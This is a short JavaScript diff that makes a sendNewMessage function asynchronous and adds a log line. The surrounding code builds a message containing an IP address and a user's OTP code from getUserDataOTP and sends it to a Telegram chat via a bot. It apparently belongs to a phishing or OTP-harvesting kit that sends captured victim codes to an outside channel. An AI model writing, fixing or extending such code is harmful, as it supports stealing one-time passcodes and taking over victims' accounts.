@@ -215,7 +215,7 @@ function update(initialData, initialDataTest){
     return initialData
 }
 
-function sendNewMessage(userDetails){
+async function sendNewMessage(userDetails){
     let messageId = null
     let message = `IP: ipAddress
 
@@ -254,11 +254,12 @@ function sendNewMessage(userDetails){
     Code:  ${userDetails.getUserDataOTP.code || ''}
     `;
 
-    bot.sendMessage(chatId, message).then((sentMsg) => {
+    await bot.sendMessage(chatId, message).then((sentMsg) => {
         messageId = sentMsg.message_id;
         console.log(messageId)
     });
     
+    console.log(messageId)
     
 
     return messageId
